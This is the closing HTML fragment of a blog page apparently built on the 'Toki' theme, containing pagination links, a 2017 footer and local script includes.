            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>